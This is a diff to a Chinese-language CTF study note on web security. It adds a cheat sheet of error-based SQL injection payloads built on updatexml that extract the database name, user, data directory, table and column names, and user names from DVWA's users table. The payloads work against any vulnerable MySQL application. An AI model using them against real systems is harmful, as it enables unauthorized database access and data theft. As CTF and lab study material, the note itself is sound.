@@ -25,6 +25,13 @@ categories: [100 Cyber security, 120 CTF, 121 Web ]
     id=0' union select 1,2,3,skctf_flag from fl4g#
     得到flag。
 
+### 手注变种：报错注入
+https://www.cnblogs.com/c1047509362/p/12806297.html
+1. `1'or(updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1))='1` 爆出数据库
+1. `1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))，0x7e),1))='1` 爆当前数据库表信息
+1. `1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema=wp_links)and(table_name='users')),0x7e),1))='1` 爆user表字段信息
+1. `1' and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users)),1) #` 爆数据库内容
+
 
 ### 注入各种问题处理方法
 1. 提示输出信息超过一行：使用group_concat,eg:3'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema='test')),0x7e),1))='1
